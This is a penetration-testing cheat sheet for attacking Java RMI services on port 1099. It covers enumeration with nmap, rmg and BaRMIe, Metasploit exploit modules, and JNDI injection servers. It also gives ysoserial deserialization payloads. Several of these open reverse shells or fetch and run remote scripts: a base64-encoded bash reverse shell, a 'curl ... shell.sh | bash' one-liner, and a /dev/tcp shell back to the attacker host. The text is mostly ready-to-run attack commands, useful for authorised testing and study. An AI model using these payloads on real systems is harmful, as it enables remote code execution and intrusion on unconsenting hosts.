# Port 1099 - Java RMI

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)

---

## Enumeration

### Nmap

```shell
nmap -sV -sC -p 1099 $rhost
nmap -p 1099 --script rmi-dumpregistry $rhost
nmap -p 1099 --script rmi-vuln-classloader $rhost
```

### Using rmg (Remote Method Guesser)

```shell
# Install
git clone https://github.com/qtc-de/remote-method-guesser.git

# Enumerate registry
java -jar rmg.jar enum $rhost 1099

# List registered objects
java -jar rmg.jar enum $rhost 1099 --list

# Guess methods
java -jar rmg.jar guess $rhost 1099
```

---

## Exploitation

### Metasploit - RMI Registry

```shell
# RMI Registry enumeration
use auxiliary/scanner/misc/java_rmi_server
set RHOSTS $rhost
run

# Exploit via classloader
use exploit/multi/misc/java_rmi_server
set RHOSTS $rhost
set LHOST $lhost
run
```

### BaRMIe Tool

```shell
# Install
git clone https://github.com/NickstaDB/BaRMIe.git

# Enumerate
java -jar BaRMIe.jar -enum $rhost 1099

# Attack
java -jar BaRMIe.jar -attack $rhost 1099
```

### JNDI Injection

```shell
# If JNDI lookup is available
# Start malicious LDAP server
java -jar ysoserial-all.jar JRMPClient "$lhost:1099" | base64

# Or use marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$lhost:8000/#Exploit"
```

### Ysoserial Payloads

```shell
# Generate RCE payload
java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.ser

# Send payload via RMI
# Use rmg or custom exploit
```

### Custom RMI Client

```java
// Connect to RMI registry
import java.rmi.registry.*;
import java.rmi.*;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry(args[0], 1099);
        
        // List bound names
        String[] names = registry.list();
        for (String name : names) {
            System.out.println("Bound: " + name);
        }
        
        // Lookup object
        Remote obj = registry.lookup(names[0]);
        System.out.println("Object class: " + obj.getClass().getName());
    }
}
```

---

## RMI Deserialization Attack

```shell
# Using ysoserial RMI gadgets
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit $rhost 1099 CommonsCollections6 "curl http://$lhost:8000/shell.sh | bash"

# Or JRMPListener
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| Nmap | `nmap -p 1099 --script rmi-dumpregistry $rhost` | Dump registry |
| rmg | `java -jar rmg.jar enum $rhost 1099` | Enumerate RMI |
| BaRMIe | `java -jar BaRMIe.jar -enum $rhost 1099` | Enumerate & attack |
| Metasploit | `use exploit/multi/misc/java_rmi_server` | RMI exploit |
